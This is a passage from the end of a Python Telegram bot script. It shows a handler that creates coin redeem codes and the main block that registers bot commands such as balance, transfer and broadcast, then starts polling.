    code = context.args[0]
    try:
        amount = int(context.args[1])
    except ValueError:
        await update.message.reply_text("❌ Invalid amount!")
        return
    create_redeem_code(code, amount, user_id)
    await update.message.reply_text(f"✅ Redeem code `{code}` created!", parse_mode="Markdown")

# ========== MAIN ==========
if __name__ == "__main__":
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("balance", balance))
    app.add_handler(CommandHandler("status", status_cmd))
    app.add_handler(CommandHandler("admin", admin))
    app.add_handler(CommandHandler("addcoins", addcoins))
    app.add_handler(CommandHandler("broadcast", broadcast))
    app.add_handler(CommandHandler("redeem", redeem_cmd))
    app.add_handler(CommandHandler("transfer", transfer))
    app.add_handler(CommandHandler("createcode", createcode))
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    print("=" * 50)
    print(f"🤖 {BOT_NAME} ({BOT_VERSION})")
    print(f"📊 Loaded {len(SERVICES)} APIs")
    print(f"👑 Owner: {OWNER}")
    print(f"📢 Channels: {CHANNEL1} | {CHANNEL2}")
    print("=" * 50)
    app.run_polling(drop_pending_updates=True)
